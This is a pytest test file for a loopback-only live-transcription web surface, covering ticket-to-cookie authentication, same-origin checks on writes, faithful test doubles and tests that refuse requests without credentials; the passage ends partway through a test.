"""Live transcription surface — the local page, the wiring, and the mutual exclusion.

Phase 1c. PRD: projects/hidock_direct/planning/live_surface_prd.md (§6.1 U-1..U-20,
§6.2 response-variant matrix).

WHY THESE TESTS LOOK LIKE THIS
------------------------------
Three properties are load-bearing and each shapes the file:

1. **The surface is an access-controlled network service.** So the HTTP tests run a
   REAL server on `127.0.0.1:0` and talk to it with real `urllib` requests. A fake
   handler dictionary would pass while the real one served the transcript to any
   process on the machine. Loopback only — nothing here reaches the network.

   Some of the credential tests use a RAW SOCKET rather than `urllib`. That is not
   fastidiousness: `http.client` refuses to put non-ASCII bytes on the wire at all,
   so the malformed-credential cases an attacker can actually send are unreachable
   through the ordinary client and would be silently untested.

2. **The device is claimed by exactly one consumer at a time** (§3.6). The offload
   poll loop and live capture drive the SAME Jensen endpoint. Suspension must be
   released on every exit path, so U-12 is three separate tests plus a bind-failure
   test that proves suspension was never *taken*.

3. **A feature can be fully tested and completely unreachable.** `ad98cbc` shipped
   the retry surface that way: every test injected the provider `__main__` never
   supplied. So U-19 asserts against the real `__main__` module — both structurally
   (AST over the actual call) and behaviourally (invoke `main()` with fakes and
   exercise a seam through the App instance it built).

Doubles here are NOT `**kwargs`-permissive. Every stand-in binds its call against
the real collaborator's signature via `_bind_against` before doing anything, per
`test_live_transcribe.py`. A double more forgiving than production cannot fail on a
contract disagreement — seven such doubles hid the 2026-08-20 `transcribe_file` bug.

THE WIRE CONTRACT THESE TESTS PIN
---------------------------------
The session token has NO URL form. Launching a window means handing a URL to a
browser as a command-line argument, and argv is world-readable to every process
running as the operator (`ps -axww`) — so a URL-borne token is readable by exactly
the class of process the token exists to exclude. What goes into the URL instead is
a single-use launch TICKET; `GET /` exchanges it, once, for the token in an
`HttpOnly` cookie, and every other route accepts that cookie and nothing else.

    GET  /?k=<ticket>       -> 200 text/html + `Set-Cookie: hidock_live=<token>;
                               Path=/; HttpOnly; SameSite=Strict`, ticket CONSUMED
    GET  /                  -> 200 text/html when the session cookie is presented
                               (this is what makes a reload work after the ticket
                               it was opened with has been spent)
    GET  /events            -> 200 text/event-stream, cookie only, each message
                               `id: <n>\\n` + `data: <json>\\n\\n` (SSE comment lines
                               starting `:` are keep-alives)
        Last-Event-ID: <n>  -> replays only turns emitted after <n>. NOT an
                               optimisation: `_STREAM_IDLE_SECONDS` recycles every
                               idle stream, so a quiet call reconnects roughly
                               every four seconds and this is the ordinary path.
    POST /names             -> 200, body {"label": "A", "name": ...}. Needs the
                               cookie AND `Content-Type: application/json` AND a
                               positive same-origin signal (`Sec-Fetch-Site:
                               same-origin`, or an `Origin` equal to `Host`).
                               The cookie alone is not consent: it is ambient
                               and rides any request to this HOST, including one
                               issued by a page on some other loopback PORT —
                               cookies are not scoped by port and `SameSite`
                               ignores it. A write carrying no origin signal at
                               all is refused rather than trusted.
    GET  /health            -> 200, no credential at all, liveness only
    every route except /health without the session COOKIE -> 403; a token or a
    ticket in the query string authenticates nothing but `GET /`

    SSE payload kinds
      {"kind":"status","live":true,"url":...}
      {"kind":"status","live":false,"near_seconds":n|null,"far_seconds":n|null}
      {"kind":"names","names":{"A":"Dana"},"labels":["A","B"]}
      {"kind":"turn","channel":"near"|"far","label":str|null,"display_name":str|null,
       "text":str,"turn_order":int,"is_final":bool,"elapsed_seconds":float}
      {"kind":"revision","channel":"far","turn_order":int,"label":str|null}
      {"kind":"error","message":str}

`display_name` is the render-time projection (FR-3.2): the stored turn keeps only
the provider `label`, and the name is applied when the turn is SENT — which is what
makes a name typed mid-call reach lines already emitted, and what makes a
`LiveSpeakerRevision` re-render a line under the new label's name without
invalidating the map. `labels` is the control panel's row set: it accumulates within
a session and is never derived from the ring, because a speaker who stopped talking
is still on the call.

EVERY test below carries a `MUTATION:` comment naming the single-line change to the
implementation that makes it fail. A test with no such mutation pins nothing.
"""

from __future__ import annotations

import ast
import http.cookies
import inspect
import json
import logging
import pathlib
import re
import signal
import socket
import subprocess
import sys
import threading
import time
import types
import urllib.error
import urllib.request
import webbrowser
from typing import Callable, Dict, List, Optional

import pytest

from hidock_direct import live_server as live_server_module
from hidock_direct.app import App, AppState
from hidock_direct.classify import RecordingKind
from hidock_direct.config import Config, load_config
from hidock_direct.device import DeviceAdapter, DeviceError
from hidock_direct.events import (
    DownloadComplete,
    Error,
    EventBus,
    LiveChannel,
    LiveSpeakerRevision,
    LiveTranscriptionStarted,
    LiveTranscriptionStopped,
    LiveTurn,
    Severity,
)
from hidock_direct.live_archive import LiveArchive, RenameOutcome
from hidock_direct.live_server import (
    LAUNCH_TIMEOUT_SECONDS,
    LiveSessionController,
    LiveSessionError,
    LiveSurface,
    launch_app_window,
)
from hidock_direct.live_transcribe import LiveTranscriber, LiveTranscriptionError
from hidock_direct.offload import Offloader
from hidock_direct.realtime import Frame, RealtimeSession, RealtimeUnavailable
from hidock_direct.state import DeviceKey, StateStore
from hidock_direct.tui import TUI

SRC = pathlib.Path(__file__).resolve().parent.parent / "src" / "hidock_direct"

# Distinctive so a leak into a log record or a page body is unambiguous.
SECRET_TEXT = "the wire transfer goes to account nine one four seven"

# Spelled out here rather than imported from the module under test: the cookie's
# NAME is part of the wire contract a browser depends on, so a rename is a
# contract change and should read as one. `test_the_ticket_exchange_sets_an
# _httponly_samesite_strict_session_cookie` is where that name is actually pinned.
COOKIE_NAME = "hidock_live"


# ---------------------------------------------------------------------------
# Faithful-double plumbing
# ---------------------------------------------------------------------------


def _bind_against(real, *args, **kwargs) -> None:
    """Raise TypeError unless this call binds against the real method signature.

    `real` is an unbound method, so `self` is supplied positionally as None.
    """
    inspect.signature(real).bind(None, *args, **kwargs)


def _bind_function(real, *args, **kwargs) -> None:
    """Same, for module-level functions (no implicit `self`)."""
    inspect.signature(real).bind(*args, **kwargs)


def _wait_until(pred, timeout: float = 2.0, msg: str = "condition never held"):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if pred():
            return
        time.sleep(0.01)
    raise AssertionError(msg)


# ---------------------------------------------------------------------------
# HTTP / SSE client helpers — real requests to a real loopback server
# ---------------------------------------------------------------------------

_UNSET = object()


def _url(surface, path: str = "/") -> str:
    """The surface's address, carrying NO credential — because none has one.

    There is deliberately no `token=` parameter here any more. The session token
    has no URL form at all, and a helper that could build one would let a test
    quietly re-pin the shape that put a live-transcript credential into argv.
    """
    return f"http://127.0.0.1:{surface.port}{path}"


def _ticket_url(surface, ticket: str, path: str = "/") -> str:
    """The only address that opens a NEW window: `/` plus a single-use ticket."""
    return f"{_url(surface, path)}?k={ticket}"


def _session_cookie(surface, token=_UNSET) -> str:
    """The `Cookie:` header a browser sends once it has completed the exchange."""
    value = surface.token if token is _UNSET else token
    return f"{COOKIE_NAME}={value}"


def _get(url: str, timeout: float = 2.0, *, cookie: Optional[str] = None,
         headers: Optional[dict] = None):
    """(status, body, headers). An HTTP error status is returned, not raised.

    `headers` is the raw `email.message.Message`, so `get_all("Set-Cookie")` works
    — a dict would collapse exactly the header the cookie tests read.
    """
    sent = dict(headers or {})
    if cookie is not None:
        sent["Cookie"] = cookie
    request = urllib.request.Request(url, headers=sent)
    try:
        with urllib.request.urlopen(request, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace"), resp.headers
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace"), exc.headers


def _post(url: str, payload: dict, timeout: float = 2.0, *,
          cookie: Optional[str] = None, headers: Optional[dict] = None):
    """A POST shaped like the one a BROWSER sends — which carries an origin signal.

    `/names` is the surface's only write, and holding the cookie is not evidence
    the operator asked for the write: the cookie is ambient and reaches this
    server from any `http://127.0.0.1:*` page the same browser has open, because
    cookies are scoped by host and not by port. So the handler demands a
    same-origin signal, and a helper that omitted one was not modelling a
    browser at all — it was modelling `curl`, and every write test in this file
    would then read as "the check does not exist" and "the check refuses
    everything" identically.

    `Sec-Fetch-Site: same-origin` is what a browser stamps on a write issued by
    the page this server itself served; page script cannot set it (it is a
    forbidden header name). `headers` overrides the default per key, and a key
    mapped to `None` is REMOVED — which is how the cross-origin tests below put
    a wrong signal, or no signal at all, on the wire.
    """
    body = json.dumps(payload).encode()
    sent = {"Content-Type": "application/json", "Sec-Fetch-Site": "same-origin"}
    sent.update(headers or {})
    sent = {name: value for name, value in sent.items() if value is not None}
    if cookie is not None:
        sent["Cookie"] = cookie
    request = urllib.request.Request(url, data=body, method="POST", headers=sent)
    try:
        with urllib.request.urlopen(request, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")


def _get_as_page(surface, path: str = "/", timeout: float = 2.0):
    """A request from a browser that has already completed the ticket exchange."""
    return _get(_url(surface, path), timeout=timeout, cookie=_session_cookie(surface))


def _post_as_page(surface, payload: dict, path: str = "/names", timeout: float = 2.0):
    return _post(
        _url(surface, path), payload, timeout=timeout, cookie=_session_cookie(surface)
    )


def _raw_request(surface, request: bytes, timeout: float = 2.0) -> bytes:
    """Put `request` on the wire verbatim and read the whole response.

    `http.client` will not send a header holding non-ASCII bytes — it raises
    client-side before anything reaches the server — so the malformed-credential
    cases §3.8 has to answer are only reachable through a raw socket.
    """
    with socket.create_connection(("127.0.0.1", surface.port), timeout=timeout) as sock:
        sock.sendall(request)
        chunks: List[bytes] = []
        try:
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                chunks.append(data)
        except (TimeoutError, socket.timeout, OSError):
            pass
    return b"".join(chunks)


def _status_line(response: bytes) -> bytes:
    return response.split(b"\r\n", 1)[0]


def _set_cookie(headers) -> str:
    """The single `Set-Cookie` the ticket exchange emits, or "" if there was none."""
    values = headers.get_all("Set-Cookie") or []
    assert len(values) <= 1, f"more than one Set-Cookie was sent: {values}"
    return values[0] if values else ""


class Page:
    """A browser stand-in: one open `EventSource` connection to `/events`.

    Authenticates with the session COOKIE, which is the only credential `/events`
    accepts. Reads are bounded by a socket timeout so a missing event costs a
    second, not a hung suite; `read()` loops until its own deadline so a slow event
    still lands.
    """

    def __init__(self, surface, cookie=_UNSET, timeout: float = 1.0,
                 last_event_id: Optional[int] = None):
        headers = {}
        presented = _session_cookie(surface) if cookie is _UNSET else cookie
        if presented is not None:
            headers["Cookie"] = presented
        if last_event_id is not None:
            # What `EventSource` itself sends on every reconnect.
            headers["Last-Event-ID"] = str(last_event_id)
        request = urllib.request.Request(_url(surface, "/events"), headers=headers)
        self._resp = urllib.request.urlopen(request, timeout=timeout)
        # The resume cursor this page would present if its stream dropped now.
        self.last_event_id: Optional[int] = None

    @property
    def content_type(self) -> str:
        return self._resp.headers.get("Content-Type", "")

    def read(self, count: int = 1, timeout: float = 2.0) -> List[dict]:
        out: List[dict] = []
        deadline = time.monotonic() + timeout
        while len(out) < count and time.monotonic() < deadline:
            try:
                line = self._resp.readline()
            except TimeoutError:
                continue
            except (OSError, ValueError):
                break
            if not line:
                break
            text = line.decode("utf-8", "replace").strip()
            if not text or text.startswith(":"):
                continue  # SSE keep-alive comment
            if text.startswith("id:"):
                # `EventSource` tracks this per message and replays it as
                # `Last-Event-ID` on reconnect; the resume tests need the same.
                self.last_event_id = int(text.split(":", 1)[1].strip())
                continue
            if text.startswith("data:"):
                out.append(json.loads(text.split(":", 1)[1].strip()))
        return out

    def drain(self, timeout: float = 1.2) -> List[dict]:
        """Everything that arrives within `timeout`. Used to assert absence."""
        out: List[dict] = []
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            got = self.read(1, timeout=max(0.05, deadline - time.monotonic()))
            if not got:
                break
            out.extend(got)
        return out

    def close(self) -> None:
        self._resp.close()


def kinds(payloads: List[dict], kind: str) -> List[dict]:
    return [p for p in payloads if p.get("kind") == kind]


def turns_of(payloads: List[dict]) -> List[dict]:
    return kinds(payloads, "turn")


@pytest.fixture
def live():
    """Factory for started surfaces and open pages; everything torn down after."""
    surfaces: List[LiveSurface] = []
    pages: List[Page] = []

    def surface(**kwargs) -> LiveSurface:
        made = LiveSurface(**kwargs)
        made.start()
        surfaces.append(made)
        return made

    def page(target, cookie=_UNSET, timeout: float = 1.0,
             last_event_id: Optional[int] = None) -> Page:
        opened = Page(
            target, cookie=cookie, timeout=timeout, last_event_id=last_event_id
        )
        pages.append(opened)
        return opened

    yield types.SimpleNamespace(surface=surface, page=page)

    for opened in pages:
        try:
            opened.close()
        except Exception:
            pass
    for made in surfaces:
        try:
            made.stop()
        except Exception:
            pass


def turn(
    text: str = "hello there",
    *,
    channel: LiveChannel = LiveChannel.FAR,
    label: Optional[str] = "A",
    order: int = 0,
    final: bool = True,
) -> LiveTurn:
    return LiveTurn(
        channel=channel, text=text, speaker=label, turn_order=order, is_final=final
    )


def near(text: str, *, order: int = 0, final: bool = True) -> LiveTurn:
    return turn(text, channel=LiveChannel.NEAR, label=None, order=order, final=final)


# ---------------------------------------------------------------------------
# Faithful doubles for the controller's collaborators
# ---------------------------------------------------------------------------


class FakeSurface:
    """Stands in for `LiveSurface`; never more permissive than the real class."""

    def __init__(self, **kwargs):
        _bind_against(LiveSurface.__init__, **kwargs)
        self.kwargs = kwargs
        self.published: List[object] = []
        self.names: Dict[str, Optional[str]] = {}
        self.started = 0
        self.stopped = 0
        self.ended = 0
        # The sink currently attached, and every attach/detach in order. The
        # real surface holds ONE, so a controller that attached a second without
        # dropping the first would be writing a finished call's names into a
        # live one's transcript.
        self.rename_sink: Optional[Callable] = None
        self.sink_history: List[str] = []
        # The page's two lifecycle buttons. Held as a dict exactly like the real
        # surface, so a controller that wired only one is visible.
        self.control_sinks: Dict[str, Callable] = {}
        self.control_requests: List[str] = []
        self.start_error: Optional[BaseException] = None
        self.stop_error: Optional[BaseException] = None
        self.end_error: Optional[BaseException] = None
        self.publish_error: Optional[BaseException] = None
        self._port = 54321
        self._token = "tok-fake-token"
        # Every ticket this surface has been asked for, with the TTL it was asked
        # for it under — the controller mints two per session with DIFFERENT
        # lifetimes and the distinction is load-bearing (argv vs the activity log).
        self.ticket_ttls: List[float] = []
        self.launch_urls: List[str] = []
        # Every call to `speaker_names()`, with the map as it stood at the time.
        # WHEN the archive reads the map is the whole point of handing it a
        # callable, so the reads are recorded rather than merely counted.
        self.speaker_names_reads: List[Dict[str, Optional[str]]] = []
        # Shared with the owning `Controller` harness when there is one, so the
        # ORDER of start's steps is observable and not merely their occurrence.
        self.timeline: List[str] = []

    def start(self) -> str:
        _bind_against(LiveSurface.start)
        if self.start_error is not None:
            raise self.start_error
        self.started += 1
        self.timeline.append("surface.start")
        return self.url

    def mint_ticket(self, ttl: float = 10.0) -> str:
        _bind_against(LiveSurface.mint_ticket, ttl)
        self.ticket_ttls.append(ttl)
        return f"ticket-{len(self.ticket_ttls)}"

    def launch_url(self, ttl: float = 10.0) -> str:
        _bind_against(LiveSurface.launch_url, ttl)
        made = f"{self.url}?k={self.mint_ticket(ttl)}"
        self.launch_urls.append(made)
        return made

    def end_session(self) -> None:
        _bind_against(LiveSurface.end_session)
        self.ended += 1
        # Deliberately does NOT clear `names`, because the real one does not.
        # That is the phase-1f change: the map survives the end of the call so
        # the operator can still type into it. A double that cleared here would
        # make post-session naming untestable by making it impossible.
        if self.end_error is not None:
            raise self.end_error

    def attach_control_sinks(self, *, stop=None, close=None) -> None:
        _bind_against(LiveSurface.attach_control_sinks, stop=stop, close=close)
        self.control_sinks = {
            name: sink for name, sink in (("stop", stop), ("close", close))
            if sink is not None
        }

    def request_control(self, action) -> bool:
        _bind_against(LiveSurface.request_control, action)
        self.control_requests.append(action)
        sink = self.control_sinks.get(action)
        if sink is None:
            return False
        # Called SYNCHRONOUSLY here on purpose: the real surface hands this to a
        # thread, and a double that did the same would make every assertion
        # about the effect a race. The off-thread requirement is asserted
        # directly, against the real surface, by the ordering test.
        sink()
        return True

    def attach_rename_sink(self, sink) -> None:
        _bind_against(LiveSurface.attach_rename_sink, sink)
        self.rename_sink = sink
        self.sink_history.append("attach" if sink is not None else "detach")

    def stop(self) -> None:
        _bind_against(LiveSurface.stop)
        self.stopped += 1
        # The real one clears its `label -> name` map here (`live_server.py:990`,
        # FR-1.6: the ring is dropped and the token retired with it). A double
        # that kept the names would make the phase-1d ordering requirement —
        # finalise the recording BEFORE the surface stops — unfalsifiable, since
        # the late read would still find the map populated.
        self.names = {}
        self.rename_sink = None
        self.control_sinks = {}
        if self.stop_error is not None:
            raise self.stop_error

    def publish(self, event) -> None:
        _bind_against(LiveSurface.publish, event)
        if self.publish_error is not None:
            raise self.publish_error
        self.published.append(event)

    def set_name(self, label, name) -> None:
        _bind_against(LiveSurface.set_name, label, name)
        self.names[label] = name

    def speaker_names(self) -> Dict[str, str]:
        # A real method, not an attribute: the controller hands the BOUND METHOD
        # to the archive so the map is read at stop rather than at start. A
        # double exposing a plain dict here would make that distinction
        # unobservable and let a snapshot-passing regression through.
        _bind_against(LiveSurface.speaker_names)
        self.speaker_names_reads.append(dict(self.names))
        return {k: v for k, v in self.names.items() if v}

    @property
    def url(self) -> str:
        # Credential-free, exactly like the real one: the token has no URL form.
        return f"http://127.0.0.1:{self._port}/"

    @property
    def port(self) -> int:
        return self._port

    @property
    def running(self) -> bool:
        # Keyed on stop, never on end_session: the whole point of phase 1f is
        # that a surface whose SESSION has ended is still serving.
        return self.started > self.stopped

    @property
    def token(self) -> str:
        return self._token


class FakeCapture:
    """Stands in for `RealtimeSession`. Blocks after its queued frames so a test
    can observe a LIVE session rather than one that has already self-terminated."""

    def __init__(self, adapter, **kwargs):
        _bind_against(RealtimeSession.__init__, adapter, **kwargs)
        self.adapter = adapter
        self.frames_to_yield: List[Frame] = [Frame(near=b"\x00\x00", far=b"\x11\x11", seq=1)]
        self.raise_after: Optional[BaseException] = None
        self.enter_error: Optional[BaseException] = None
        self.entered = 0
        self.stopped = 0
        self.block_after_frames = True
        self.released = threading.Event()
        self.first_frame_sent = threading.Event()
        # Shared with the owning harness so CONTEXT NESTING is observable. Phase
        # 1d's ordering claim is about which `__exit__` runs last, and counters
        # cannot express that.
        self.timeline: List[str] = []

    def __enter__(self) -> "FakeCapture":
        _bind_against(RealtimeSession.__enter__)
        if self.enter_error is not None:
            raise self.enter_error
        self.entered += 1
        self.timeline.append("capture.enter")
        return self

    def __exit__(self, exc_type, exc, tb) -> bool:
        _bind_against(RealtimeSession.__exit__, exc_type, exc, tb)
        self.timeline.append("capture.exit")
        self.stop()
        return False

    def stop(self) -> None:
        _bind_against(RealtimeSession.stop)
        self.stopped += 1
        self.released.set()

    def frames(self):
        _bind_against(RealtimeSession.frames)
        for frame in self.frames_to_yield:
            yield frame
            self.first_frame_sent.set()
        if self.raise_after is not None:
            raise self.raise_after
        if self.block_after_frames:
            self.released.wait(timeout=5.0)


class FakeTranscriber:
    """Stands in for `LiveTranscriber`."""

    def __init__(self, bus, **kwargs):
        _bind_against(LiveTranscriber.__init__, bus, **kwargs)
        self.bus = bus
        self.kwargs = kwargs
        self.fed: List[Frame] = []
        self.feed_error: Optional[BaseException] = None
        self.enter_error: Optional[BaseException] = None
        self.entered = 0
        self.stopped = 0
        self.timeline: List[str] = []

    def __enter__(self) -> "FakeTranscriber":
        _bind_against(LiveTranscriber.__enter__)
        if self.enter_error is not None:
            raise self.enter_error
        self.entered += 1
        self.timeline.append("transcriber.enter")
        return self

    def __exit__(self, exc_type, exc, tb) -> bool:
        _bind_against(LiveTranscriber.__exit__, exc_type, exc, tb)
        self.timeline.append("transcriber.exit")
        self.stop()
        return False

    def stop(self, reason: str = "stopped") -> None:
        _bind_against(LiveTranscriber.stop, reason=reason)
        self.stopped += 1

    def feed(self, frame) -> None:
        _bind_against(LiveTranscriber.feed, frame)
        if self.feed_error is not None:
            raise self.feed_error
        self.fed.append(frame)
        self.timeline.append("feed")


class FakeArchive:
    """Stands in for `LiveArchive` (phase 1d).

    Binds against the real class the same way every other double here does, so a
    controller that called it with the wrong keyword — or stopped handing it the
    `names` CALLABLE — fails at the seam instead of passing on a permissive
    signature. Records the ORDER of its lifecycle against the harness timeline,
    because `live_archive_prd.md` §7's ordering claims ("audio to disk before the
    wire", "finalise before the surface stops") are order claims and a counter
    cannot falsify one.
    """

    def __init__(self, archive_dir, *, bus, operator_name, names=None, clock=None,
                 keep_wav_dir=None):
        kwargs = dict(bus=bus, operator_name=operator_name, names=names)
        if clock is not None:
            kwargs["clock"] = clock
        if keep_wav_dir is not None:
            kwargs["keep_wav_dir"] = keep_wav_dir
        _bind_against(LiveArchive.__init__, archive_dir, **kwargs)
        self.archive_dir = archive_dir
        self.bus = bus
        self.operator_name = operator_name
        self.names = names
        # Recorded, not merely accepted: the diagnostic keep-dir must reach the
        # recorder, and a double that swallowed it would make the composition
        # root's wiring unfalsifiable.
        self.keep_wav_dir = keep_wav_dir
        self.written: List[Frame] = []
        self.entered = 0
        self.stops = 0
        self.write_error: Optional[BaseException] = None
        self.stop_error: Optional[BaseException] = None
        self.exit_error: Optional[BaseException] = None
        # Set by the tests that care; `None` means "nothing was earned", which is
        # the real class's own pre-audio state.
        self._wav_path = None
        self._transcript_path = None
        # The map as `names()` returned it at stop. The controller's whole reason
        # for passing a callable is that this is read LATE.
        self.names_at_stop: Optional[Dict[str, str]] = None
        # Every post-session rename, and what this double answers with. The real
        # class decides the outcome from the document on disk; a double that
        # always reported success would make the controller's severity routing
        # — which is how the operator learns their name did NOT land —
        # unfalsifiable.
        self.renames: List[tuple] = []
        self.rename_result = RenameOutcome(applied=True, reason="applied")
        self.rename_error: Optional[BaseException] = None
        self.timeline: List[str] = []

    @property
    def wav_path(self):
        return self._wav_path

    @property
    def transcript_path(self):
        return self._transcript_path

    def rename_speaker(self, label, name) -> RenameOutcome:
        _bind_against(LiveArchive.rename_speaker, label, name)
        self.renames.append((label, name))
        if self.rename_error is not None:
            raise self.rename_error
        return self.rename_result

    def __enter__(self) -> "FakeArchive":
        _bind_against(LiveArchive.__enter__)
        self.entered += 1
        self.timeline.append("archive.enter")
        return self

    def __exit__(self, exc_type, exc, tb) -> bool:
        _bind_against(LiveArchive.__exit__, exc_type, exc, tb)
        self.timeline.append("archive.exit")
        if self.exit_error is not None:
            raise self.exit_error
        self.stop()
        return False

    def write(self, frame) -> None:
        _bind_against(LiveArchive.write, frame)
        if self.write_error is not None:
            raise self.write_error
        self.written.append(frame)
        self.timeline.append("archive.write")

    def stop(self) -> None:
        _bind_against(LiveArchive.stop)
        self.stops += 1
        self.timeline.append("archive.stop")
        if self.names is not None and self.names_at_stop is None:
            # Exactly what the real one does at stop (§5), and the only way a
            # snapshot-vs-callable regression becomes visible from out here.
            self.names_at_stop = self.names()
        if self.stop_error is not None:
            raise self.stop_error


class _FakeAdapter:
    """Minimal `DeviceAdapter`; every method binds against the real Protocol."""

    def __init__(self, count: int = 0, connected: bool = True):
        self._count = count
        self._connected = connected
        self.file_count_calls = 0

    def get_file_count(self) -> int:
        _bind_against(DeviceAdapter.get_file_count)
        self.file_count_calls += 1
        return self._count

    def is_connected(self) -> bool:
        _bind_against(DeviceAdapter.is_connected)
        return self._connected

    def disconnect(self) -> None:
        _bind_against(DeviceAdapter.disconnect)
        self._connected = False


class Controller:
    """A `LiveSessionController` wired to faithful doubles, bus drained to a list."""

    def __init__(self, *, busy: bool = False, **overrides):
        self.bus = EventBus()
        self.events: List[object] = []
        self.bus.subscribe(self.events.append)
        self.adapter = _FakeAdapter()
        self.surfaces: List[FakeSurface] = []
        self.captures: List[FakeCapture] = []
        self.transcribers: List[FakeTranscriber] = []
        self.archives: List[FakeArchive] = []
        self.archive_error: Optional[BaseException] = None
        self.suspends = 0
        self.resumes = 0
        self.launched: List[str] = []
        self.launch_error: Optional[BaseException] = None
        # Every ordered step of `start()` that this harness can see, in the order
        # it actually happened. Counters answer "did it run"; only a timeline can
        # answer "did it run BEFORE the thing it has to run before".
        self.timeline: List[str] = []
        self._busy = busy

        kwargs = dict(
            bus=self.bus,
            adapter=self.adapter,
            api_key="k-test",
            suspend_polling=self._suspend,
            resume_polling=self._resume,
            busy_predicate=self._busy_predicate,
            surface_factory=self._surface_factory,
            capture_factory=self._capture_factory,
            transcriber_factory=self._transcriber_factory,
            archive_factory=self._archive_factory,
            launch_browser=self._launch,
        )
        # `archive_dir` is NOT defaulted here. It is None on the controller, and
        # None means "this composition archives nothing" — so registering the
        # factory unconditionally leaves every pre-1d test untouched (the factory
        # is never reached) while the 1d tests opt in by passing `archive_dir`.
        kwargs.update(overrides)
        self.controller = LiveSessionController(**kwargs)

    # -- seams ------------------------------------------------------------

    def _suspend(self) -> bool:
        _bind_against(App.suspend_device_polling)
        self.suspends += 1
        self.timeline.append("suspend")
        # The real one returns whether the endpoint drained inside its bounded
        # wait; a double that returned None would let a caller start depending on
        # falsiness the production call never produces on the happy path.
        return True

    def _resume(self) -> None:
        _bind_against(App.resume_device_polling)
        self.resumes += 1
        self.timeline.append("resume")

    def _busy_predicate(self) -> bool:
        return self._busy

    def _surface_factory(self, **kwargs) -> FakeSurface:
        made = FakeSurface(**kwargs)
        made.timeline = self.timeline
        self.surfaces.append(made)
        return made

    def _capture_factory(self, adapter, **kwargs) -> FakeCapture:
        made = FakeCapture(adapter, **kwargs)
        made.timeline = self.timeline
        self.timeline.append("capture")
        self.captures.append(made)
        return made

    def _transcriber_factory(self, bus, **kwargs) -> FakeTranscriber:
        made = FakeTranscriber(bus, **kwargs)
        made.timeline = self.timeline
        self.timeline.append("transcriber")
        self.transcribers.append(made)
        return made

    def _archive_factory(self, archive_dir, **kwargs) -> FakeArchive:
        if self.archive_error is not None:
            raise self.archive_error
        made = FakeArchive(archive_dir, **kwargs)
        made.timeline = self.timeline
        self.timeline.append("archive")
        self.archives.append(made)
        return made

    def _launch(self, url, **kwargs) -> str:
        _bind_function(launch_app_window, url, **kwargs)
        self.launched.append(url)
        if self.launch_error is not None:
            raise self.launch_error
        return "opened in Google Chrome"

    # -- driving ----------------------------------------------------------

    @property
    def surface(self) -> FakeSurface:
        assert self.surfaces, "no surface was created"
        return self.surfaces[-1]

    @property
    def capture(self) -> FakeCapture:
        _wait_until(lambda: self.captures, msg="capture was never created")
        return self.captures[-1]

    @property
    def transcriber(self) -> FakeTranscriber:
        _wait_until(lambda: self.transcribers, msg="transcriber was never created")
        return self.transcribers[-1]

    @property
    def archive(self) -> FakeArchive:
        assert self.archives, (
            "no archive was created — the controller was given no `archive_dir`, "
            "or `_new_archive` swallowed the factory call"
        )
        return self.archives[-1]

    def infos(self) -> List[Error]:
        return [e for e in self.errors() if e.severity is Severity.INFO]

    def errors(self) -> List[Error]:
        return [e for e in self.events if isinstance(e, Error)]

    def messages(self) -> str:
        return "\n".join(e.message for e in self.errors())


@pytest.fixture
def controller():
    made: List[Controller] = []

    def build(**kwargs) -> Controller:
        harness = Controller(**kwargs)
        made.append(harness)
        return harness

    yield build

    for harness in made:
        try:
            harness.controller.stop()
        except Exception:
            pass


# ==========================================================================
# U-1 — loopback only
# ==========================================================================


def _bound_address(surface):
    """The address the surface's HTTP server ACTUALLY bound.

    Scans the surface's attributes for the `socketserver.BaseServer` it holds, so
    the test is agnostic about the attribute's name but still reads the real
    socket rather than trusting the URL string, which can say `127.0.0.1` while
    the socket listens on every interface.
    """
    for value in vars(surface).values():
        address = getattr(value, "server_address", None)
        if isinstance(address, tuple) and len(address) >= 2:
            return address
    raise AssertionError(
        "LiveSurface holds no object exposing `server_address`; the bound address "
        "cannot be read, so loopback-only cannot be verified"
    )


def test_the_server_binds_loopback_and_never_every_interface(live):
    """FR-1.1. This serves live conversation transcripts; `0.0.0.0` puts them on
    the LAN. Asserted on the bound socket, not on the URL the surface reports."""
    # MUTATION: `host: str = "127.0.0.1"` -> `host: str = "0.0.0.0"` in
    # LiveSurface.__init__ (or passing "" to the server constructor).
    surface = live.surface()

    assert _bound_address(surface)[0] == "127.0.0.1"
    assert surface.url.startswith("http://127.0.0.1:")
    assert inspect.signature(LiveSurface.__init__).parameters["host"].default == "127.0.0.1"


def test_the_default_port_is_zero_so_the_os_picks_a_free_one(live):
    """FR-1.2. A fixed port collides with whatever else the operator runs and turns
    a working feature into an intermittent one; the real port is read back from the
    socket, not assumed."""
    # MUTATION: `port: int = 0` -> `port: int = 8080` in LiveSurface.__init__.
    assert inspect.signature(LiveSurface.__init__).parameters["port"].default == 0

    surface = live.surface()
    assert surface.port == _bound_address(surface)[1]
    assert surface.port > 0, "the chosen port must be read back from the socket"


# ==========================================================================
# U-2 — every route except /health requires a credential
# ==========================================================================


@pytest.mark.parametrize("path", ["/", "/events"])
def test_get_routes_refuse_a_request_with_no_credential(live, path):
    """FR-1.3 / §8. Loopback binding is NOT an access control: any process running
    as the operator, and any page they have open at a guessable localhost port,
    reaches this server."""
    # MUTATION: delete the credential check at the top of the GET handler.
    surface = live.surface()

    status, _body, _headers = _get(_url(surface, path))

    assert status == 403, f"{path} served without a credential"


@pytest.mark.parametrize("path", ["/", "/events"])
def test_get_routes_refuse_a_wrong_cookie(live, path):
    """A cookie that is merely PRESENT must not pass — the check has to compare."""
    # MUTATION: `secrets.compare_digest(...)` -> `token is not None` in
    # `LiveSurface.authorises`.
    surface = live.surface()

    status, _body, _headers = _get(
        _url(surface, path), cookie=_session_cookie(surface, "not-the-token")
    )

    assert status == 403


def test_names_post_refuses_a_request_with_no_credential(live):
    """FR-ERR-5 — a POST is a state change, so it is the route that matters most."""
    # MUTATION: skip the credential check on the POST branch (a real omission risk,
    # because the GET branch and the POST branch are separate methods).
    surface = live.surface()

    status, _body = _post(_url(surface, "/names"), {"label": "A", "name": "X"})

    assert status == 403


def test_health_answers_without_a_credential_and_reveals_only_liveness(live):
    """NFR-3. `/health` is the launcher's readiness wait, so it must answer before
    the operator has any credential — and therefore must carry nothing else."""
    # MUTATION: include the transcript ring (or the token) in the /health body.
